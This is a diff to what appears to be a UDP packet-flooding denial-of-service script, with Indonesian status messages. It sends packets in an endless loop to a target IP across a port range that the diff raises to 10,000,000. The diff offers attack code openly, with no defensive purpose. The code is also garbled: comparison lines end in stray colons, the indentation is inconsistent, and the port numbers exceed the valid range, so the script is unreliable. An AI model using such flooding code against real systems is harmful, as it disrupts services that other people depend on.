@@ -52,16 +52,14 @@ print("Waiting 3 second Attack Send Packet")
 time.sleep(3)
 while True:
     sent = 0
-    for port in range(1, 65534):
+    for port in range(1, 10000000):
         white.sendto(bytes, (ip, port))
-                random = random + 1
-                random==65534
                 sent = sent + 1
-                sent==65534:
+                sent==10000000:
                 port = port + 1
-                port==65534:
+                port==10000000:
                 ping = ping + 1
-                ping ==65534:
+                ping ==10000000:
         print("\033[1;91mSend \033[1;32m%s \033[1;91m Mengirim Packet \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))
 
 print("\033[1;92mAttack finished\033[0m")
